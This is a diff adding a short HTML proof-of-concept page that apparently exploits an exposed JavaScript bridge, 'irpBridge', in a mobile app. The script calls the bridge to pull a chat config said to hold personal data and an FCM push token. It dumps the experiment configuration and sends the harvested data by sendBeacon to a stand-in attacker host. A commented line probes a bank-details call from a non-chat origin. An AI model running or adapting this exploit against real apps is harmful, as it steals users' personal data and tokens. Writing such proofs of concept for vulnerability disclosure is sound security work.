@@ -1,0 +1,19 @@
+<!doctype html>
+<script>
+  window.onChatConfigReady = function (c) {
+    document.body.innerText = "LEAKED:\n" + JSON.stringify(c, null, 2);
+    navigator.sendBeacon("https://attacker.example.com/collect",
+                         JSON.stringify(c));
+  };
+  try {
+    document.body.innerText = "irpBridge present: " + (typeof irpBridge);
+    // Pull PII + FCM token
+    irpBridge.getChatConfig();
+    // And dump the full IrpExperiment
+    document.body.innerText += "\n\nconfig:\n" + irpBridge.sendConfigResponse();
+    // Optional: prove onCtaClick is reachable from a non-chat origin
+    // irpBridge.onCtaClick("MY_BANK_DETAILS", "{}");
+  } catch (e) {
+    document.body.innerText = "no bridge: " + e;
+  }
+</script>
